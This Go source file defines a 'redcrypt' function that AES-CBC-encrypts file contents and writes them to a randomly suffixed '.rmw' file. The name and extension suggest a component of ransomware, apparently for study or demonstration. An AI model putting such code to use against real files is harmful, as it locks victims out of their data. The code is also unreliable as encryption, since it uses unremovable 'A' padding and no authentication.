package redcrypt

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"io"
	"math"
	"os"
)

const BlockSize = 16

func check (e error){
	if e != nil{
		panic(e)
	}
}

func randomBase64String(l int) string {
    buff := make([]byte, int(math.Ceil(float64(l)/float64(1.33333333333))))
    rand.Read(buff)
    str := base64.RawURLEncoding.EncodeToString(buff)
    return str[:l] 
}

func Redcrypt(filepath string, key string, plaintextbytes []byte)  {
	keybytes := []byte(key)

	//Check block size and if not long enough pad it
	blockcheck := len(plaintextbytes) % aes.BlockSize
	var paddedbytes []byte
	if blockcheck != 0 {
		padding := bytes.Repeat([]byte("A"), (16-blockcheck))
		paddedbytes = append(plaintextbytes, padding...)
	} else {
		paddedbytes = plaintextbytes
	}
	//Block
	block, err := aes.NewCipher(keybytes)
	if err != nil {
		panic(err)
	}

	//Initialisation vector
	ciphertext := make([]byte, aes.BlockSize+len(paddedbytes))
	iv := ciphertext[:aes.BlockSize]
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		panic(err)
	}

	mode := cipher.NewCBCEncrypter(block, iv)
	mode.CryptBlocks(ciphertext[aes.BlockSize:], paddedbytes)

	// Create new encrypted file, including original extension
	rString := randomBase64String(16)
	efilepath := filepath + string(rString) + ".rmw"
	encfile, err := os.Create(efilepath)
	check(err)
	defer encfile.Close() 
	encfile.Write(ciphertext)

	fmt.Printf("Encrypted file: %s\n:",string(efilepath))

}
